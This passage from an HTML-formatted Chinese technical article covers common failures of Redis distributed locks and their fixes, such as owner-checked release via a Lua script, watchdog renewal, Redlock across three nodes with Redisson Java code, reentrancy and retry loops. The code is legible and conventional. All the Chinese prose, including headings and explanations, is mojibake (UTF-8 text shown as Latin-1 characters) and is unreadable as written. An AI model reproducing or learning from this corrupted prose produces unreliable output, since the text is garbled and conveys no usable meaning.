å¤§é—®é¢˜ï¼Œé€ä¸€æ‹†è§£æˆå› ã€è¡¨ç°åŠæ ¹æ²»æ–¹æ¡ˆï¼Œå¸®å¤§å®¶é¿å¼€è¿™äº›â€œéšå½¢ç‚¸å¼¹â€ã€‚</p>\n<p>å…ˆæ˜ç¡®å‰æï¼šåˆ†å¸ƒå¼é”çš„æ ¸å¿ƒæ˜¯â€œäº’æ–¥æ€§â€ï¼Œä½†åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹ï¼Œç½‘ç»œå»¶è¿Ÿã€æœåŠ¡å®•æœºã€Redis é›†ç¾¤åŒæ­¥å»¶è¿Ÿç­‰å› ç´ ï¼Œéƒ½ä¼šç ´åé”çš„ç¨³å®šæ€§ã€‚æ‰€æœ‰é—®é¢˜çš„æœ¬è´¨ï¼Œè¦ä¹ˆæ˜¯â€œåŸå­æ€§ç¼ºå¤±â€ï¼Œè¦ä¹ˆæ˜¯â€œé«˜å¯ç”¨è€ƒè™‘ä¸è¶³â€ï¼Œè¦ä¹ˆæ˜¯â€œä¸šåŠ¡ä¸é”æœºåˆ¶ä¸åŒ¹é…â€ã€‚</p>\n<h2 id=\"ä¸€æ ¸å¿ƒé—®é¢˜åŠè§£å†³æ–¹æ¡ˆæŒ‰è¸©å‘é¢‘ç‡æ’åº\">ä¸€ã€æ ¸å¿ƒé—®é¢˜åŠè§£å†³æ–¹æ¡ˆï¼ˆæŒ‰è¸©å‘é¢‘ç‡æ’åºï¼‰</h2>\n<h3 id=\"é—®é¢˜-1è¯¯åˆ ä»–äººæŒæœ‰é”æœ€åŸºç¡€ä¹Ÿæœ€æ˜“çŠ¯çš„æ¼æ´\">é—®é¢˜ 1ï¼šè¯¯åˆ ä»–äººæŒæœ‰é”â€”â€”æœ€åŸºç¡€ä¹Ÿæœ€æ˜“çŠ¯çš„æ¼æ´</h3>\n<p><strong>æˆå› </strong>ï¼šé‡Šæ”¾é”æ—¶æœªåšèº«ä»½æ ¡éªŒï¼Œç›´æ¥æ‰§è¡Œ DEL å‘½ä»¤åˆ é™¤é”®ã€‚å…¸å‹åœºæ™¯ï¼šæœåŠ¡ A æŒæœ‰é”åï¼Œä¸šåŠ¡é€»è¾‘è€—æ—¶è¶…è¿‡é”è¿‡æœŸæ—¶é—´ï¼Œé”è¢«è‡ªåŠ¨é‡Šæ”¾ï¼›æœåŠ¡ B è¶æœºåŠ é”æˆåŠŸï¼Œæ­¤æ—¶æœåŠ¡ A æ‰§è¡Œå®Œä¸šåŠ¡ï¼Œç›´æ¥ DEL é”å°±ä¼šè¯¯åˆ æœåŠ¡ B æŒæœ‰çš„é”ï¼Œå¯¼è‡´äº’æ–¥æ€§å¤±æ•ˆã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šå¤šä¸ªæœåŠ¡å®ä¾‹åŒæ—¶æŒæœ‰åŒä¸€æŠŠé”ï¼Œæ“ä½œåŒä¸€èµ„æºï¼Œå‡ºç°æ•°æ®ä¸ä¸€è‡´ï¼ˆå¦‚è¶…å–ã€é‡å¤è®¢å•ï¼‰ã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šåŠ é”æ—¶å­˜å…¥å…¨å±€å”¯ä¸€çš„éšæœºå€¼ï¼ˆå¦‚ UUID+çº¿ç¨‹ IDï¼‰ä½œä¸º valueï¼Œé‡Šæ”¾é”å‰å…ˆéªŒè¯ value æ˜¯å¦ä¸è‡ªèº«æŒæœ‰ä¸€è‡´ï¼Œä¸€è‡´æ‰é‡Šæ”¾ã€‚å…³é”®æ˜¯ç”¨ Lua è„šæœ¬ä¿è¯â€œéªŒè¯+åˆ é™¤â€çš„åŸå­æ€§ï¼Œé¿å…éªŒè¯åé”è¿‡æœŸè¢«ä»–äººæŒæœ‰ã€‚</p>\n<pre><code class=\"language-lua\">-- å®‰å…¨é‡Šæ”¾é”çš„ Lua è„šæœ¬\nif redis.call('get', KEYS[1]) == ARGV[1] then\n    return redis.call('del', KEYS[1])\nelse\n    return 0\nend\n</code></pre>\n<p>æ³¨æ„ï¼šä¸¥ç¦æ‹†åˆ†â€œéªŒè¯â€å’Œâ€œåˆ é™¤â€ä¸ºä¸¤æ­¥æ“ä½œï¼Œå¦åˆ™ä»å­˜åœ¨å¹¶å‘æ¼æ´ã€‚</p>\n<h3 id=\"é—®é¢˜-2é”è¿‡æœŸæå‰é‡Šæ”¾ä¸šåŠ¡æœªåšå®Œé”å·²å¤±æ•ˆ\">é—®é¢˜ 2ï¼šé”è¿‡æœŸæå‰é‡Šæ”¾â€”â€”ä¸šåŠ¡æœªåšå®Œé”å·²å¤±æ•ˆ</h3>\n<p><strong>æˆå› </strong>ï¼šé”çš„è¿‡æœŸæ—¶é—´è®¾ç½®è¿‡çŸ­ï¼Œè€Œä¸šåŠ¡é€»è¾‘æ‰§è¡Œè€—æ—¶è¿‡é•¿ï¼Œå¯¼è‡´é”åœ¨ä¸šåŠ¡å®Œæˆå‰å°±è‡ªåŠ¨è¿‡æœŸé‡Šæ”¾ï¼Œå…¶ä»–æœåŠ¡å¯è¶æœºåŠ é”ï¼Œå¼•å‘å¹¶å‘å†²çªã€‚æ¯”å¦‚é”è®¾ä¸º 30 ç§’è¿‡æœŸï¼Œä½†æ•°æ®åº“å¤æ‚æŸ¥è¯¢ã€ç¬¬ä¸‰æ–¹æ¥å£è°ƒç”¨è€—æ—¶ 40 ç§’ï¼Œå°±ä¼šå‡ºç°é”æå‰å¤±æ•ˆã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šä¸šåŠ¡æ‰§è¡Œä¸­é”è¢«é‡Šæ”¾ï¼Œå¤šä¸ªæœåŠ¡åŒæ—¶æ“ä½œèµ„æºï¼Œå‡ºç°æ•°æ®é”™è¯¯ï¼Œä¸”é—®é¢˜å…·æœ‰éšæœºæ€§ï¼ˆå–å†³äºä¸šåŠ¡è€—æ—¶æ˜¯å¦è¶…è¿‡è¿‡æœŸæ—¶é—´ï¼‰ã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå¼•å…¥â€œé”ç»­çº¦ï¼ˆWatch Dogï¼‰â€æœºåˆ¶ã€‚æœåŠ¡æˆåŠŸåŠ é”åï¼Œå¯åŠ¨åå°å®ˆæŠ¤çº¿ç¨‹ï¼Œæ¯éš”é”è¿‡æœŸæ—¶é—´çš„ 1/3 ï¼ˆå¦‚ 10 ç§’ï¼‰æ£€æŸ¥é”æ˜¯å¦ä»è¢«è‡ªèº«æŒæœ‰ï¼Œè‹¥æŒæœ‰åˆ™å»¶é•¿é”çš„è¿‡æœŸæ—¶é—´ï¼ˆé‡ç½®ä¸º 30 ç§’ï¼‰ï¼Œç›´åˆ°ä¸šåŠ¡å®Œæˆä¸»åŠ¨é‡Šæ”¾é”ã€‚</p>\n<p>å®é™…å¼€å‘ä¸­æ— éœ€æ‰‹åŠ¨å®ç°ï¼ŒRedisson æ¡†æ¶å†…ç½® Watch Dog æœºåˆ¶ï¼ŒåŠ é”åè‡ªåŠ¨ç»­çº¦ï¼Œå½»åº•è§£å†³é”æå‰é‡Šæ”¾é—®é¢˜ã€‚</p>\n<h3 id=\"é—®é¢˜-3redis-å•ç‚¹æ•…éšœé”æœåŠ¡æ•´ä½“ä¸å¯ç”¨\">é—®é¢˜ 3ï¼šRedis å•ç‚¹æ•…éšœâ€”â€”é”æœåŠ¡æ•´ä½“ä¸å¯ç”¨</h3>\n<p><strong>æˆå› </strong>ï¼šRedis é‡‡ç”¨å•ç‚¹éƒ¨ç½²ï¼Œå½“ Redis æœåŠ¡å®•æœºï¼ˆå¦‚è¿›ç¨‹å´©æºƒã€æœåŠ¡å™¨æ–­ç”µï¼‰ï¼Œæ‰€æœ‰åˆ†å¸ƒå¼é”çš„åŠ é”ã€é‡Šæ”¾æ“ä½œéƒ½ä¼šå¤±è´¥ï¼Œå¯¼è‡´åˆ†å¸ƒå¼ç³»ç»Ÿçš„å¹¶å‘æ§åˆ¶æœºåˆ¶å´©æºƒï¼Œæ— æ³•æ­£å¸¸å¤„ç†èµ„æºç«äº‰ã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šæ‰€æœ‰ä¾èµ–åˆ†å¸ƒå¼é”çš„ä¸šåŠ¡æ¥å£æŠ¥é”™ï¼Œæ— æ³•æ‰§è¡Œï¼ˆå¦‚åº“å­˜æ‰£å‡ã€è®¢å•åˆ›å»ºæ¥å£ï¼‰ï¼Œç”šè‡³å¼•å‘æœåŠ¡é›ªå´©ã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šé‡‡ç”¨ Redis é«˜å¯ç”¨é›†ç¾¤éƒ¨ç½²ï¼Œä¸¤ç§ä¸»æµæ–¹æ¡ˆæŒ‰éœ€é€‰æ‹©ï¼š</p>\n<ol>\n<li>\n<p><strong>ä¸»ä»å¤åˆ¶ + å“¨å…µæ¨¡å¼</strong>ï¼šéƒ¨ç½² 1 ä¸»å¤šä» Redis é›†ç¾¤ï¼Œå“¨å…µå®æ—¶ç›‘æ§ä¸»èŠ‚ç‚¹çŠ¶æ€ï¼Œä¸»èŠ‚ç‚¹å®•æœºæ—¶è‡ªåŠ¨å°†ä»èŠ‚ç‚¹åˆ‡æ¢ä¸ºä¸»èŠ‚ç‚¹ï¼Œä¿è¯ Redis æœåŠ¡è¿ç»­æ€§ã€‚ç¼ºç‚¹æ˜¯å­˜åœ¨â€œè„‘è£‚â€é£é™©ï¼ˆä¸»ä»æ•°æ®åŒæ­¥å»¶è¿Ÿå¯¼è‡´é”ä¸¢å¤±ï¼‰ï¼Œé€‚åˆå¯¹ä¸€è‡´æ€§è¦æ±‚ä¸€èˆ¬çš„åœºæ™¯ã€‚</p>\n</li>\n<li>\n<p><strong>Redlock ç®—æ³•</strong>ï¼šå‘è‡³å°‘ 3 ä¸ªç‹¬ç«‹çš„ Redis ä¸»èŠ‚ç‚¹å‘èµ·åŠ é”è¯·æ±‚ï¼Œä»…å½“è¶…è¿‡åŠæ•°èŠ‚ç‚¹åŠ é”æˆåŠŸï¼Œä¸”æ€»è€—æ—¶ä¸è¶…è¿‡è¶…æ—¶æ—¶é—´ï¼Œæ‰ç®—åŠ é”æˆåŠŸã€‚å³ä½¿éƒ¨åˆ†èŠ‚ç‚¹å®•æœºï¼Œåªè¦å¤šæ•°èŠ‚ç‚¹æ­£å¸¸ï¼Œé”æœåŠ¡å°±å¯ç”¨ï¼Œå½»åº•é¿å…å•ç‚¹æ•…éšœå’Œè„‘è£‚é—®é¢˜ï¼Œé€‚åˆé«˜ä¸€è‡´æ€§åœºæ™¯ã€‚Redisson å·²å†…ç½® Redlock å®ç°ï¼Œå¼€ç®±å³ç”¨ï¼Œä»¥ä¸‹æ˜¯å®Œæ•´å®æˆ˜é…ç½®ä¸ä»£ç ï¼š</p>\n</li>\n</ol>\n<h4 id=\"1-å¤šç»„ç‹¬ç«‹-redis-èŠ‚ç‚¹é…ç½®yml\">1. å¤šç»„ç‹¬ç«‹ Redis èŠ‚ç‚¹é…ç½®ï¼ˆYMLï¼‰</h4>\n<p>Redlock è¦æ±‚èŠ‚ç‚¹ç‰©ç†ç‹¬ç«‹ï¼ˆé¿å…åŒä¸€æœºæˆ¿æ•…éšœç‰µè¿å¤šç»„èŠ‚ç‚¹ï¼‰ï¼Œæ¯ç»„èŠ‚ç‚¹å¯å•ç‹¬éƒ¨ç½²ä¸»ä»+å“¨å…µæå‡å¯ç”¨æ€§ï¼Œ3 ç»„èŠ‚ç‚¹å®Œæ•´é…ç½®å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-yaml\">spring:\n  redis:\n    # Redlock ä¸“ç”¨å¤šç»„ç‹¬ç«‹èŠ‚ç‚¹é…ç½®\n    redlock:\n      # ç¬¬ä¸€ç»„èŠ‚ç‚¹ï¼ˆå¯éƒ¨ç½²ä¸»ä»+å“¨å…µï¼‰\n      node1:\n        host: 192.168.1.101\n        port: 6379\n        password: 123456\n        database: 0\n        timeout: 5000  # è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰\n      # ç¬¬äºŒç»„èŠ‚ç‚¹ï¼ˆç‹¬ç«‹æœåŠ¡å™¨ï¼Œä¸ç¬¬ä¸€ç»„æ— å…³è”ï¼‰\n      node2:\n        host: 192.168.1.102\n        port: 6379\n        password: 123456\n        database: 0\n        timeout: 5000\n      # ç¬¬ä¸‰ç»„èŠ‚ç‚¹ï¼ˆç‹¬ç«‹æœåŠ¡å™¨ï¼Œå»ºè®®è·¨æœºæˆ¿ï¼‰\n      node3:\n        host: 192.168.1.103\n        port: 6379\n        password: 123456\n        database: 0\n        timeout: 5000\n</code></pre>\n<h4 id=\"2-redisson-å®¢æˆ·ç«¯é…ç½®å¤šèŠ‚ç‚¹å®ä¾‹åŒ–\">2. Redisson å®¢æˆ·ç«¯é…ç½®ï¼ˆå¤šèŠ‚ç‚¹å®ä¾‹åŒ–ï¼‰</h4>\n<p>é€šè¿‡é…ç½®ç±»è¯»å– YML ä¿¡æ¯ï¼Œåˆ›å»ºå¯¹åº” RedissonClient å®ä¾‹ï¼Œä¿è¯æ¯ç»„èŠ‚ç‚¹ç‹¬ç«‹è¿æ¥ï¼š</p>\n<pre><code class=\"language-java\">@Configuration\npublic class RedissonRedlockConfig {\n\n    // ç¬¬ä¸€ç»„ Redlock èŠ‚ç‚¹å®¢æˆ·ç«¯\n    @Bean(name = \"redlockClient1\")\n    public RedissonClient redlockClient1(\n            @Value(\"${spring.redis.redlock.node1.host}\") String host,\n            @Value(\"${spring.redis.redlock.node1.port}\") int port,\n            @Value(\"${spring.redis.redlock.node1.password}\") String password,\n            @Value(\"${spring.redis.redlock.node1.database}\") int database,\n            @Value(\"${spring.redis.redlock.node1.timeout}\") int timeout) {\n        Config config = new Config();\n        // å•èŠ‚ç‚¹æ¨¡å¼ï¼ˆè‹¥ä¸ºé›†ç¾¤ï¼Œå¯æ”¹ç”¨ useSentinelServers é…ç½®å“¨å…µï¼‰\n        config.useSingleServer()\n                .setAddress(\"redis://\" + host + \":\" + port)\n                .setPassword(password)\n                .setDatabase(database)\n                .setTimeout(timeout);\n        return Redisson.create(config);\n    }\n\n    // ç¬¬äºŒç»„ Redlock èŠ‚ç‚¹å®¢æˆ·ç«¯\n    @Bean(name = \"redlockClient2\")\n    public RedissonClient redlockClient2(\n            @Value(\"${spring.redis.redlock.node2.host}\") String host,\n            @Value(\"${spring.redis.redlock.node2.port}\") int port,\n            @Value(\"${spring.redis.redlock.node2.password}\") String password,\n            @Value(\"${spring.redis.redlock.node2.database}\") int database,\n            @Value(\"${spring.redis.redlock.node2.timeout}\") int timeout) {\n        Config config = new Config();\n        config.useSingleServer()\n                .setAddress(\"redis://\" + host + \":\" + port)\n                .setPassword(password)\n                .setDatabase(database)\n                .setTimeout(timeout);\n        return Redisson.create(config);\n    }\n\n    // ç¬¬ä¸‰ç»„ Redlock èŠ‚ç‚¹å®¢æˆ·ç«¯\n    @Bean(name = \"redlockClient3\")\n    public RedissonClient redlockClient3(\n            @Value(\"${spring.redis.redlock.node3.host}\") String host,\n            @Value(\"${spring.redis.redlock.node3.port}\") int port,\n            @Value(\"${spring.redis.redlock.node3.password}\") String password,\n            @Value(\"${spring.redis.redlock.node3.database}\") int database,\n            @Value(\"${spring.redis.redlock.node3.timeout}\") int timeout) {\n        Config config = new Config();\n        config.useSingleServer()\n                .setAddress(\"redis://\" + host + \":\" + port)\n                .setPassword(password)\n                .setDatabase(database)\n                .setTimeout(timeout);\n        return Redisson.create(config);\n    }\n}\n</code></pre>\n<h4 id=\"3-redlock-åŠ é”é‡Šæ”¾é”ä¸šåŠ¡ä»£ç \">3. Redlock åŠ é”/é‡Šæ”¾é”ä¸šåŠ¡ä»£ç </h4>\n<p>é€šè¿‡ RedissonRedLock ç»„åˆå¤šèŠ‚ç‚¹é”ï¼Œè‡ªåŠ¨è§¦å‘æŠ•ç¥¨é€»è¾‘ï¼Œå…¼å®¹æ™®é€šé”ç”¨æ³•ï¼Œå†…ç½® Watch Dog ç»­çº¦ï¼š</p>\n<pre><code class=\"language-java\">@Service\npublic class StockService {\n\n    @Autowired\n    @Qualifier(\"redlockClient1\")\n    private RedissonClient redlockClient1;\n\n    @Autowired\n    @Qualifier(\"redlockClient2\")\n    private RedissonClient redlockClient2;\n\n    @Autowired\n    @Qualifier(\"redlockClient3\")\n    private RedissonClient redlockClient3;\n\n    @Autowired\n    private StockMapper stockMapper;\n\n    public void deductStock(Long productId) {\n        // 1. ç”Ÿæˆç»Ÿä¸€é”Keyï¼Œè·å–å¤šèŠ‚ç‚¹é”å¯¹è±¡\n        String lockKey = \"lock:stock:\" + productId;\n        RLock lock1 = redlockClient1.getLock(lockKey);\n        RLock lock2 = redlockClient2.getLock(lockKey);\n        RLock lock3 = redlockClient3.getLock(lockKey);\n\n        // 2. ç»„åˆä¸ºRedlocké”ï¼Œè§¦å‘å¤šèŠ‚ç‚¹æŠ•ç¥¨\n        RedissonRedLock redLock = new RedissonRedLock(lock1, lock2, lock3);\n\n        try {\n            // 3. åŠ é”ï¼š1ç§’å†…ç­‰å¾…èŠ‚ç‚¹å“åº”ï¼Œé”è¿‡æœŸæ—¶é—´30ç§’ï¼ˆå†…ç½®ç»­çº¦ï¼‰\n            boolean locked = redLock.tryLock(1000, 30000, TimeUnit.MILLISECONDS);\n            if (locked) {\n                // 4. æ ¸å¿ƒä¸šåŠ¡ï¼šåº“å­˜æ‰£å‡ï¼ˆä»…ä¿ç•™é”å†…å¿…è¦æ“ä½œï¼‰\n                Stock stock = stockMapper.selectById(productId);\n                if (stock != null &amp;&amp; stock.getCount() &gt; 0) {\n                    stock.setCount(stock.getCount() - 1);\n                    stockMapper.updateById(stock);\n                }\n            } else {\n                // åŠ é”å¤±è´¥å…œåº•\n                throw new RuntimeException(\"ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨åå†è¯•\");\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(\"æ“ä½œè¢«ä¸­æ–­ï¼Œè¯·é‡è¯•\");\n        } finally {\n            // 5. å®‰å…¨é‡Šæ”¾é”ï¼šä»…å½“å‰çº¿ç¨‹æŒæœ‰é”æ—¶æ‰§è¡Œ\n            if (redLock.isHeldByCurrentThread()) {\n                redLock.unlock();\n            }\n        }\n    }\n}\n</code></pre>\n<p>å…³é”®è¯´æ˜ï¼šâ‘  å¤šç»„èŠ‚ç‚¹éœ€ç‰©ç†éš”ç¦»ï¼Œè·¨æœºæˆ¿éƒ¨ç½²å¯æå‡å®¹é”™ï¼›â‘¡ 3 ç»„èŠ‚ç‚¹æœ€å¤šå…è®¸ 1 ç»„æ•…éšœï¼Œè¶…è¿‡åŠæ•°èŠ‚ç‚¹åŠ é”æˆåŠŸå³ç”Ÿæ•ˆï¼›â‘¢ é‡Šæ”¾é”æ—¶è‡ªåŠ¨åŒæ­¥æ¸…ç†æ‰€æœ‰èŠ‚ç‚¹é”æ•°æ®ï¼Œæ— éœ€æ‰‹åŠ¨åè°ƒã€‚</p>\n<h3 id=\"é—®é¢˜-4é”æ— æ³•é‡å…¥åµŒå¥—ä¸šåŠ¡æ­»é”\">é—®é¢˜ 4ï¼šé”æ— æ³•é‡å…¥â€”â€”åµŒå¥—ä¸šåŠ¡æ­»é”</h3>\n<p><strong>æˆå› </strong>ï¼šåŸºç¡€å®ç°çš„é”ä¸æ”¯æŒé‡å…¥ï¼Œå³åŒä¸€æœåŠ¡çš„åŒä¸€çº¿ç¨‹åœ¨æŒæœ‰é”çš„æƒ…å†µä¸‹ï¼Œå†æ¬¡è¯·æ±‚åŠ åŒä¸€æŠŠé”ä¼šå¤±è´¥ã€‚å…¸å‹åœºæ™¯ï¼šæœåŠ¡ A åŠ é”åï¼Œæ‰§è¡Œçš„æ–¹æ³•ä¸­åˆè°ƒç”¨äº†å¦ä¸€ä¸ªéœ€è¦åŠ åŒä¸€æŠŠé”çš„æ–¹æ³•ï¼Œç¬¬äºŒæ¬¡åŠ é”å¤±è´¥ï¼Œå¯¼è‡´çº¿ç¨‹é˜»å¡ï¼Œå¼•å‘æ­»é”ã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šä¸šåŠ¡çº¿ç¨‹é˜»å¡ï¼Œæ¥å£è¶…æ—¶æ— å“åº”ï¼Œæ’æŸ¥åå‘ç°æ˜¯åŒä¸€çº¿ç¨‹é‡å¤åŠ é”è¢«æ‹’ã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå®ç°å¯é‡å…¥é”æœºåˆ¶ã€‚é”çš„ value å­˜å‚¨â€œå”¯ä¸€æ ‡è¯† + é‡å…¥æ¬¡æ•°â€ï¼Œç¬¬ä¸€æ¬¡åŠ é”æ—¶å­˜å…¥æ ‡è¯†å’Œæ¬¡æ•° 1ï¼›åŒä¸€çº¿ç¨‹å†æ¬¡åŠ é”æ—¶ï¼ŒéªŒè¯æ ‡è¯†ä¸€è‡´ï¼Œå°†æ¬¡æ•°åŠ  1ï¼›é‡Šæ”¾é”æ—¶ï¼Œæ¬¡æ•°å‡ 1ï¼Œç›´åˆ°æ¬¡æ•°ä¸º 0 æ‰åˆ é™¤é”®å½»åº•é‡Šæ”¾é”ã€‚</p>\n<p>æ‰‹åŠ¨å®ç°é€»è¾‘å¤æ‚ï¼Œæ¨èä½¿ç”¨ Redisson çš„ RLock æ¥å£ï¼Œå¤©ç„¶æ”¯æŒå¯é‡å…¥ï¼Œç”¨æ³•ä¸æœ¬åœ° synchronized é”ä¸€è‡´ï¼Œæ— éœ€é¢å¤–å¼€å‘ã€‚</p>\n<h3 id=\"é—®é¢˜-5ä¸»ä»åˆ‡æ¢é”ä¸¢å¤±è„‘è£‚é›†ç¾¤ç¯å¢ƒä¸‹çš„éšå½¢å‘\">é—®é¢˜ 5ï¼šä¸»ä»åˆ‡æ¢é”ä¸¢å¤±ï¼ˆè„‘è£‚ï¼‰â€”â€”é›†ç¾¤ç¯å¢ƒä¸‹çš„éšå½¢å‘</h3>\n<p><strong>æˆå› </strong>ï¼šRedis ä¸»ä»é›†ç¾¤ä¸­ï¼Œä¸»èŠ‚ç‚¹å­˜å‚¨é”æ•°æ®åï¼Œå°šæœªåŒæ­¥åˆ°ä»èŠ‚ç‚¹å°±å®•æœºï¼›å“¨å…µå°†ä»èŠ‚ç‚¹åˆ‡æ¢ä¸ºä¸»èŠ‚ç‚¹ï¼Œæ–°ä¸»èŠ‚ç‚¹æ— è¯¥é”æ•°æ®ï¼Œå…¶ä»–æœåŠ¡å¯é‡æ–°åŠ é”ï¼Œå¯¼è‡´åŸé”å¤±æ•ˆï¼Œå‡ºç°å¤šä¸ªæœåŠ¡æŒæœ‰é”çš„æƒ…å†µã€‚è¿™æ˜¯ä¸»ä» + å“¨å…µæ¨¡å¼çš„å›ºæœ‰é£é™©ã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šä¸»ä»åˆ‡æ¢åï¼ŒåŸæŒæœ‰é”çš„æœåŠ¡ä»åœ¨æ‰§è¡Œä¸šåŠ¡ï¼Œæ–°æœåŠ¡å´èƒ½åŠ é”æˆåŠŸï¼Œå¼•å‘æ•°æ®å†²çªï¼Œä¸”é—®é¢˜éš¾ä»¥å¤ç°ï¼ˆä»…å‘ç”Ÿåœ¨ä¸»ä»åˆ‡æ¢ç¬é—´ï¼‰ã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>\n<ul>\n<li>\n<p>ä½ä¸€è‡´æ€§åœºæ™¯ï¼šå¼€å¯ Redis ä¸»ä»åŒæ­¥çš„â€œæŒä¹…åŒ– + ç­‰å¾…åŒæ­¥ç¡®è®¤â€ï¼Œä¸»èŠ‚ç‚¹å†™å…¥é”æ•°æ®åï¼Œç­‰å¾…è‡³å°‘ 1 ä¸ªä»èŠ‚ç‚¹åŒæ­¥å®Œæˆå†è¿”å›åŠ é”æˆåŠŸï¼Œé™ä½é”ä¸¢å¤±æ¦‚ç‡ï¼ˆä»æ— æ³•å®Œå…¨é¿å…ï¼‰ã€‚</p>\n</li>\n<li>\n<p>é«˜ä¸€è‡´æ€§åœºæ™¯ï¼šæ”¾å¼ƒä¸»ä» + å“¨å…µæ¨¡å¼ï¼Œæ”¹ç”¨ Redlock ç®—æ³•ï¼Œé€šè¿‡å¤šä¸»èŠ‚ç‚¹æŠ•ç¥¨æœºåˆ¶ï¼Œä»æ ¹æºä¸Šè§£å†³è„‘è£‚å¯¼è‡´çš„é”ä¸¢å¤±é—®é¢˜ã€‚</p>\n</li>\n</ul>\n<h3 id=\"é—®é¢˜-6åŠ é”å¤±è´¥æ— é‡è¯•ç­–ç•¥ä¸šåŠ¡å¶å‘å¤±è´¥\">é—®é¢˜ 6ï¼šåŠ é”å¤±è´¥æ— é‡è¯•ç­–ç•¥â€”â€”ä¸šåŠ¡å¶å‘å¤±è´¥</h3>\n<p><strong>æˆå› </strong>ï¼šåŠ é”æ—¶ä»…å°è¯•ä¸€æ¬¡ï¼Œè‹¥å› ç½‘ç»œæ³¢åŠ¨ã€Redis ä¸´æ—¶ç¹å¿™å¯¼è‡´åŠ é”å¤±è´¥ï¼Œç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´ä¸šåŠ¡æ‰§è¡Œå¤±è´¥ã€‚åˆ†å¸ƒå¼ç¯å¢ƒä¸­ï¼Œç½‘ç»œæŠ–åŠ¨ã€Redis ç¬æ—¶å‹åŠ›å¤§æ˜¯å¸¸è§æƒ…å†µï¼Œæ— é‡è¯•ç­–ç•¥ä¼šæ”¾å¤§è¿™ç±»é—®é¢˜çš„å½±å“ã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šéƒ¨åˆ†ç”¨æˆ·æ“ä½œå¤±è´¥ï¼ˆå¦‚æäº¤è®¢å•æç¤ºâ€œç³»ç»Ÿç¹å¿™â€ï¼‰ï¼Œé‡è¯•åå¯æˆåŠŸï¼Œé—®é¢˜å…·æœ‰éšæœºæ€§ã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå®ç°å¸¦é™åˆ¶çš„é‡è¯•æœºåˆ¶ï¼ŒåŠ é”å¤±è´¥åï¼Œé—´éš”ä¸€å®šæ—¶é—´ï¼ˆå¦‚ 100msï¼‰é‡è¯•ï¼ŒåŒæ—¶è®¾ç½®æœ€å¤§é‡è¯•æ¬¡æ•°ï¼ˆå¦‚ 3 æ¬¡ï¼‰å’Œæ€»è¶…æ—¶æ—¶é—´ï¼ˆå¦‚ 1 ç§’ï¼‰ï¼Œé¿å…æ— é™é‡è¯•å¯¼è‡´ Redis å‹åŠ›è¿‡å¤§ï¼Œä¹Ÿèƒ½æå‡åŠ é”æˆåŠŸç‡ã€‚</p>\n<pre><code class=\"language-java\">// å¸¦é‡è¯•çš„åŠ é”é€»è¾‘ï¼ˆSpring Data Redis ç¤ºä¾‹ï¼‰\npublic boolean lockWithRetry(String key, String value, long expireMs, int maxRetry, long retryIntervalMs) {\n    for (int i = 0; i &lt; maxRetry; i++) {\n        Boolean result = redisTemplate.opsForValue().setIfAbsent(key, value, expireMs, TimeUnit.MILLISECONDS);\n        if (Boolean.TRUE.equals(result)) {\n            return true;\n        }\n        try {\n            Thread.sleep(retryIntervalMs);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return false;\n        }\n    }\n    return false;\n}\n</code></pre>\n<h3 id=\"é—®é¢˜-7é•¿æ—¶é—´æŒæœ‰é”ç³»ç»Ÿå¹¶å‘é‡éª¤é™\">é—®é¢˜ 7ï¼šé•¿æ—¶é—´æŒæœ‰é”â€”â€”ç³»ç»Ÿå¹¶å‘é‡éª¤é™</h3>\n<p><strong>æˆå› </strong>ï¼šåœ¨é”çš„èŒƒå›´å†…æ‰§è¡Œè€—æ—¶æ“ä½œï¼ˆå¦‚å¤æ‚æ•°æ®åº“æŸ¥è¯¢ã€ç¬¬ä¸‰æ–¹æ¥å£è°ƒç”¨ã€å¤§é‡æ•°æ®å¤„ç†ï¼‰ï¼Œå¯¼è‡´é”æŒæœ‰æ—¶é—´è¿‡é•¿ï¼Œå…¶ä»–æœåŠ¡è¯·æ±‚è¯¥é”æ—¶è¢«é•¿æ—¶é—´é˜»å¡ï¼Œç³»ç»Ÿååé‡å¤§å¹…ä¸‹é™ã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šä¾èµ–è¯¥é”çš„æ¥å£å“åº”æ—¶é—´å˜é•¿ï¼Œå¹¶å‘é‡ä¸Šä¸å»ï¼Œç›‘æ§æ˜¾ç¤ºå¤§é‡çº¿ç¨‹é˜»å¡åœ¨åŠ é”ç¯èŠ‚ã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>\n<ul>\n<li>\n<p>ç²¾ç®€é”å†…ä¸šåŠ¡ï¼šä»…å°†â€œèµ„æºç«äº‰æ ¸å¿ƒé€»è¾‘â€ï¼ˆå¦‚åº“å­˜æ‰£å‡ã€è®¢å•çŠ¶æ€ä¿®æ”¹ï¼‰æ”¾å…¥é”å†…ï¼Œéæ ¸å¿ƒé€»è¾‘ï¼ˆå¦‚æ—¥å¿—è®°å½•ã€æ¶ˆæ¯æ¨é€ï¼‰ç§»è‡³é”å¤–æ‰§è¡Œã€‚</p>\n</li>\n<li>\n<p>å¼‚æ­¥åŒ–å¤„ç†ï¼šè‹¥é”å†…å¿…é¡»æ‰§è¡Œè€—æ—¶æ“ä½œï¼Œå°†å…¶å¼‚æ­¥åŒ–ï¼ˆå¦‚ç”¨çº¿ç¨‹æ± 